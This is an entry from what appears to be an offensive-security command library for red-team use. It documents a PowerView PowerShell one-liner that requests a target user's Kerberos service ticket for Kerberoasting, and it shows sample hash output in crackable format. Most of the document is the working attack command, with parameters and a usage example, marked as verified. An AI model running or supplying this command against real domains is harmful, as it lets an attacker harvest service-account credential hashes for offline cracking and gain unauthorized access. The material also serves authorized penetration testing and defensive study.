---
type: command
executor: powershell
data: >-
  $User = Get-DomainUser $_TARGET_USER; $User | Get-DomainSPNTicket |
  Format-List; $User | Select-Object serviceprincipalname
output: null
platforms:
  - Windows
tags:
  - active-directory
  - kerberoasting
verified: true
validated: true
---

# powerview-get-domainuser-get-spnticket

## Command

```powershell
$User = Get-DomainUser $_TARGET_USER; $User | Get-DomainSPNTicket | Format-List; $User | Select-Object serviceprincipalname
```

## Description

Retrieves a user's domain object, requests the SPN ticket (TGS) for Kerberoasting, and displays it along with the SPN for verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_USER | Target username | Yes |

## Examples

### Basic Usage

```powershell
$User = Get-DomainUser targetuser; $User | Get-DomainSPNTicket | Format-List
```

## Expected Output

ServicePrincipalName : ops/whatever1
Hash                 : $krb5tgs$23$*targetuser$DOMAIN$ops/whatever1$*hash

## Related

- [[procedures/Active-Directory-ACL-Abuse-via-Kerberoasting-and-AS-REP-Roasting]]
- [[tools/PowerView]]
